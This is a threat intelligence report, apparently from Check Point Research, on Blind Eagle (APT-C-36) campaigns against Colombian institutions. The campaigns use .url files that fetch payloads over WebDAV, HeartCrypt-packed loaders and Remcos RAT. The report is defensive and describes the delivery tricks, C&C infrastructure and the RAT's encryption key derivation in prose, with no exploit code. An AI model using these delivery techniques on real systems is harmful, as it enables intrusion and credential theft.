Key Points
Check Point Research discovered a series of ongoing campaigns targeting Colombian institutions and government entities since November 2024. The campaigns are linked to Blind Eagle, also known as APT-C-36, and deliver malicious .url files, which cause a similar effect to the CVE-2024-43451 vulnerability.
CVE-2024-43451 exposes a user’s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. This vulnerability can be triggered just by right-clicking, deleting, or dragging the file. While the Blind Eagle malicious file does not exploit this vulnerability, it triggers a WebDAV request in the same uncommon ways, notifying the attacker that the file was downloaded. Finally, when the user clicks on the file, it downloads the next-stage payload via another WebDAV request and executes the malware.
Microsoft patched the original vulnerability on November 12, 2024. Just six days later, Blind Eagle included this .url variant in its attack arsenal and campaigns.
The monitored campaigns targeted Colombian judicial institutions and other government or private organizations, with high infection rates. More than 1,600 victims were affected during one of these campaigns which took place around December 19, 2024. This infection rate is significant considering Blind Eagle’s targeted APT approach.
The malware is often delivered using legitimate file-sharing platforms such as Google Drive and Dropbox. However, in recent campaigns, Blind Eagle has also distributed its payloads through Bitbucket and GitHub.
The group utilizes malware and tools which are well-known within underground crime communities, a trend that continues with recent discoveries. To protect its malware, Blind Eagle leverages the Packer-as-a-Service HeartCrypt, which employs a .NET RAT that appears to be a variant of  PureCrypter. The final stage payload is Remcos RAT.
Blind Eagle has long been suspected to originate from South America. We identified the group’s operating timezone as UTC-5, which aligns with several South American countries.
Operation fail (OPFail) revealed phishing campaigns in early March 2024 in which the group impersonated Colombian banks. These campaigns were highly successful, resulting in the collection of over 8,000 entries of Personally Identifiable Information (PII).

Introduction
APT-C-36, also known as Blind Eagle, is a threat group that engages in both espionage and cybercrime. It primarily targets organizations in Colombia and other Latin American countries. Active since 2018, this Advanced Persistent Threat (APT) group focuses on government institutions, financial organizations, and critical infrastructure.

Blind Eagle is known for employing sophisticated social engineering tactics, using phishing emails with malicious attachments or links to gain initial access to target systems. Their malware arsenal includes commodity Remote Access Trojans (RATs) such as NjRAT, AsyncRAT, and Remcos.

Our research revealed that the group recently expanded its toolkit with additional commodity malware. To protect their malicious executables, Blind Eagle utilizes the Packer-as-a-Service HeartCrypt, which they use to pack a .NET RAT that appears to be a variant of PureCrypter. Remcos RAT remains the final payload.

On November 12, 2024, Microsoft patched a newly discovered vulnerability, CVE-2024-43451. This vulnerability was actively exploited in the wild using .url files containing malicious code, which could be triggered through unusual user actions such as right-clicking the file, deleting it, or performing a drag-and-drop operation. Exploited as a zero-day, it was used in attacks targeting Ukraine. According to CERT-UA, the campaign was attributed to the threat actor UAC-0194, suspected to be Russian-affiliated.

Six days after Microsoft released the patch, Blind Eagle included a variant of this exploit in its attack arsenal and campaigns. While this variant does not actually expose the NTLMv2 hash, it notifies the threat actors that the file was downloaded by the same unusual user-file interactions. On devices vulnerable to CVE-2024-43451, a WebDAV request is triggered even before the user manually interacts with the file with the same unusual behavior. Meanwhile, on both patched and unpatched systems, manually clicking the malicious .url file initiates the download and execution of the next-stage payload. After incorporating this file into their campaigns, the group targeted mainly Colombian public and private organizations, with high infection rates. More than 1600 victims were infected during a campaign that occurred around December 19, 2024. Considering Blind Eagle’s targeted APT approach, this infection rate is significant.

Blind Eagle .url Payloads
CVE-2024-43451 is a vulnerability that exposes a user’s NTLMv2 hash, which can allow an attacker to authenticate as the user via pass-the-hash or relay attacks. If the compromised account has high privileges and proper mitigations (such as SMB signing and NTLM relay protections) that are not enforced, this could lead to lateral movement, privilege escalation, or even full domain compromise. Eventually, the user, by manually clicking, creates an SMB connection through port 445, which downloads and executes the malicious payload. The exploit reported by CERT-UA:

CVE-2024-43451 affects all supported Windows versions, and it is triggered in uncommon ways:

A single right-click on the file (all Windows versions).
Deleting the file (Windows 10/11).
Dragging the file to another folder (Windows 10/11 and some Windows 7/8/8.1 configurations).
The .url file below, used by Blind Eagle against Colombian institutions, is a variant of this CVE, but without the exploiting part, meaning it does not expose the NTLMv2 hash. When manually clicked by the user, this file also downloads malicious files, but instead of using SMB (port: 445), it uses HTTP. When a URL is in UNC Path format, it first attempts an SMB connection, and if this is unavailable, it attempts WebDAV. However, once the port is specified, which in this case is @80, the SMB attempt is avoided, and the connection is made directly over HTTP with the User-Agent Microsoft-WebDAV-MiniRedir/10.0.19044.

While this variant does not directly exploit the vulnerability, it exhibits unusual behavior by communicating with the server without requiring manual user interaction. However, for the .url file to download the next-stage payload, the user must manually click it, which triggers a WebDAV request over port 80.

This variant serves as a valuable tool for threat actors, as it notifies them when a targeted user downloads the malicious .url file. Even if the user does not directly execute the file, Blind Eagle can still detect the interaction, providing insight into potential targets.

Since Microsoft patched this vulnerability, this unusual behavior no longer occurs. However, manual user interaction can still trigger the download and execution of the malicious payload.

Blind Eagle Campaigns
Microsoft published this vulnerability on November 12, 2024. On November 18, we observed the first crafted payload. This .url file infected both patched and unpatched machines. Since then, we observed multiple campaigns targeting Colombia, and the dropped payload was a .NET RAT that downloads the final stage from GitHub or BitBucket, a Remcos RAT. However, to this day, most of those .url files are not detected by any Anti-Virus engine on VirusTotal.

These ongoing campaigns, based on filenames, appear to primarily target various Colombian government organizations, including the Justice System. These are some of the malicious .url filenames:

[English] - "Protective Order 0439594 - Case No. 03948939-002024."
While operating with the specific malicious file for over two months, the APT group has changed approximately more than ten different C&Cs (Command and Control Servers) for its final stage payload. The attack chain has some small variations, but the .url files are always part of the campaign during the initial stage.

Campaigns ‘socialismo’ & ‘miami’- January 21-22, 2025
During the campaigns that took place around January 21 and 22, 2025, the APT group distributed multiple .url files via email through possibly compromised Google Drive accounts.

The specified file icon in the .url file is equivalent to the one from the Edge browser. Many of the endpoints contacted by the .url contain multiple malicious files, though we can not attribute all files hosted on those servers to Blind Eagle.

The downloaded executable appears to be packed using the Packer as a Service HeartCrypt. This later injects into csc.exe a .NET executable responsible for unpacking and executing in memory a .NET RAT, which appears to be a variant of PureCrypter. This .NET RAT retrieves various user and machine information such as 1) Username, 2) OS Version, 3) Process name and architecture, 4) Antivirus installed, and other machine specs. After it decrypted its configuration, which is embedded as a resource, we observed the campaign ID socialismo and the C&C which communicates. The C&C republicadominica2025[.]ip-ddns[.]com, after it received the user data, responded with a URL to download and execute the next stage payload. The final stage is downloaded from the GitHub repository Oscarito20222/file, and the malware is the known Remote Access Trojan Remcos RAT with C&C elyeso.ip-ddns[.]com:30204 and Botnet name redtube.

Both of the domain names from the .NET RAT and the Remcos RAT resolve to the same IP address 177.255.85[.]101. The group has used this IP for multiple Remcos C&Cs through January & February campaigns:

amuntgroupfree.ip-ddns[.]com
donato.con-ip[.]com
elyeso.ip-ddns[.]com
comina998.ddns-ip[.]net
republicadominica2025.ip-ddns[.]com
It is worth mentioning that the attacker’s GitHub repository is used in multiple Blind Eagle campaigns to deliver the final stage payload, Remcos. This repository is constantly updated with new files that communicate with the latest C&C. All the repository updates were committed in the timezone -0500, which could possibly indicate Blind Eagle’s country of origin aligns with South American countries. Examples of commits:

The GitHub account also contains another repository named diciembre, which includes an archive with a .vbs file. Notably, this commit from two years ago was made in the same UTC-5 timezone as the recent activity.

This repository, which was “untouched” for over two years, was updated on February 25, 2025, and introduced a new Remcos RAT with C&C 21ene.ip-ddns[.]com:30204.

Campaigns ‘PARAISO’, ‘PARAISO2’, ‘marte’ & ‘saturno’ – December 2024
Although similar to the previous campaign, this one leveraged Bitbucket instead of GitHub as the final-stage distribution platform.

In these campaigns, two Bitbucket repositories were abused and contained Remcos RAT executable files, which were uploaded to Bitbucket around December 2024. Considering this APT group’s activity and approach, a significant number of victims ultimately downloaded these malicious executables.

The PARAISO campaign was very successful, infecting more than 1600 victims with Remcos RAT and C&C newstaticfreepoint24.ddns-ip.net:3020. The total infections across those campaigns, which occurred for over a week, were approximately 9,000.

Blind Eagle – .url Campaigns
Since adding this file to its arsenal, Blind Eagle consistently targeted Colombia, primarily focusing on justice and other government organizations. The group sent emails with malicious Google Drive links containing either an archive or the actual .url. Those files triggered WebDAV requests on unpatched machines and, once clicked by the user, resulted in a WebDAV request that downloaded a HeartCrypt-packed malware. This malware then extracted and injected a packed .NET loader into csc.exe, which later loaded a .NET RAT which appears to be a variant of PureCrypter. This .NET RAT decrypted its configuration, which contains execution parameters such as the C&C server and the campaign ID. After sending encrypted user data, the malware receives a URL to download the final stage payload, Remcos RAT. Those final payloads were initially hosted on compromised servers and later on GitHub or Bitbucket.

Throughout multiple campaigns, the group registered different domain names for its C&C servers, even though they were hosted on the same IP address. During campaigns such as socialismo, the C&C of the .NET RAT was republicadominica2025[.]ip-ddns[.]com and for the final stage elyeso.ip-ddns[.]com, but both of them resolved to the same IP 177[.]255.85[.]101.

APT OPFail & Past Phishing Campaigns
Check Point Research was closely monitoring Blind Eagle activities, we discovered an operation failure in which the group revealed its past phishing activities together with the victim’s Personally Identifiable Information (PII).

During January and February, the APT group delivered the last stage payload via files uploaded to the Oscarito20222/file repository. The account Oscarito20222 also had another repository, which had only one commit from two years ago, Oscarito20222/diciembre.

On February 25, 2025, this changed. The repository diciembre received updates and also began delivering Remcos during the next campaigns. To understand why this shift occurred, we had to examine the previous repository responsible for delivering the final payload in the attack chain.

For approximately 1 hour and 27 minutes, the group uploaded an HTML file named Ver Datos del Formulario.html, which was later deleted. As of now, this remains the last recorded action in the repository, which occurred on February 25, 2025, at 15:27 UTC.

At this point, Blind Eagle resumed its activity, using the repository Oscarito20222/diciembre, with the first commit taking place at 17:39 UTC the same day:

Check Point Research obtained this HTML file, which was linked to phishing activities from early March 2024. The phishing domain servicioseguroenlineabb[.]com appears to have impersonated Colombian Banks.

The PII data contains four fields:

Nombre de Usuario, Username
Contraseña Usuario, User Password
Correo electrónico, Email
Contraseña del correo, Email Password
Clave Cajero, ATM PIN
The dataset (Referred to as: “Datos del Formulario”) contained over 8,400 entries, with 8,075 valid after filtering out empty or insufficient records. These valid entries included account-password pairs (username or email or all data filled), with 1,634 email addresses identified.

The phishing campaign specifically targeted Colombian users. Among the collected email addresses:

The majority were personal accounts (Gmail, Yahoo, Hotmail, etc.).
Five belonged to the Colombian government.
correo.policia.gov.co
sic.gov.co
contraloria.gov.co
adr.gov.co
dian.gov.co
Fourteen were associated with educational institutions.
The remaining addresses belonged to businesses operating in Colombia.

.NET RAT – “Remcos Downloader”
The .NET RAT delivered during the malware campaigns is protected with HeartCrypt, a Packer-as-a-Service (PaaS) that emerged in early 2024 to obfuscate malware and evade detection by security software. This packer embeds malicious code into otherwise legitimate binaries, with the packed payload stored as a resource. When executed, HeartCrypt first unpacks a simple .NET packer, which is injected into and triggered within csc.exe.

This .NET packer contains an embedded buffer that is:

Decrypted using AES
Decompressed with GZIP
Loaded into memory as a .NET RAT assembly
In addition, the final executable (.NET RAT assembly) is obfuscated with NET-Reactor, applying both string encryption and control flow obfuscation to further hinder analysis.

The majority of the strings are encrypted and stored inside a resource, which is immediately decrypted when execution begins. Then, each time a specific string is required, the malware requests it based on the index ID, where the index points to the DWORD size of the string followed by the string content. The decrypted variable (containing the decrypted strings resource) follows the structure of how strings are stored in the #US stream in .NET binaries. NETReactorSlayer (a well-known open-source deobfuscator for NET-Reactor-protected binaries) is able to decrypt those strings and deobfuscate such binaries.

The decrypted resource contains a base64 string, which is deserialized and contains the malware configuration along with the C&C.

}
The malware collects information regarding the execution, machine, and user, then serializes them using protobuf and encrypts them using AES. Data sent to the C&C:

Bot ID
Campaign ID socialismo
Username
OS Version
Malware version 0.3.9
Antivirus installed
Process Architecture
Process name
Machine specs …
The malware attempts to retrieve IP addresses from the C&C domain name (GetHostAddresses) and, if successful, sends the collected information.

Data is serialized, and machine information is sent along with the malware campaign socialismo and version 0.3.9.

The AES key used to encrypt and decrypt network communications is derived by calling Rfc2898DeriveBytes using as a password the mutex name mono1234 and salt { 1, 2, 23, 234, 37, 48, 134, 63, 248, 4 }.

A similar process then retrieves the response from the C&C server, which responds with a buffer containing the DWORD size followed by the AES encrypted buffer. At this moment, Blind Eagle has utilized this RAT as a downloader, receiving a URL with the file being downloaded and injected either into MSBuild.exe or InstallUtil.exe.

Even though Blind Eagle uses this command the most, utilizing this .NET RAT as a simple downloader, the malware also contains other functionalities, such as downloading the next payload on disk, maintaining persistence via scheduled tasks, or even executing PowerShell scripts.

Conclusion
Blind Eagle remains one of the most active and dangerous threat actors in Latin America, with a particular focus on Colombia’s public and private sectors. The group’s scale and persistence are evident, with over 1,600 infections recorded from a single campaign. Long suspected of originating in Latin America, the confirmation of its UTC-5 operating timezone further narrows its likely base of operations to several South American countries.

Despite Microsoft’s release of a patch for CVE-2024-43451 on November 12, 2024, Blind Eagle quickly adapted, introducing a variant of the “exploit” in just six days. This rapid response highlights the group’s technical expertise, adaptability, and relentless pursuit of new attack methods. By incorporating malicious .url files into its arsenal, Blind Eagle continues to refine its tactics, ensuring its malware distribution remains effective against evolving security defenses.

A key factor in its success is its ability to exploit legitimate file-sharing platforms, including Google Drive, Dropbox, Bitbucket, and GitHub, allowing it to bypass traditional security measures and distribute malware stealthily. Additionally, its use of underground crimeware tools such as Remcos RAT, HeartCrypt, and PureCrypter reinforces its deep ties to the cybercriminal ecosystem, granting access to sophisticated evasion techniques and persistent access methods.

Blind Eagle’s rapid evolution, effective social engineering tactics, and focus on both public and private sector entities make it a critical cybersecurity threat. Mitigating its impact requires proactive threat intelligence, advanced security defenses, and continuous monitoring. Organizations must remain vigilant against phishing campaigns, file-based malware delivery, and unconventional attack techniques to stay ahead of this ever-adapting adversary.
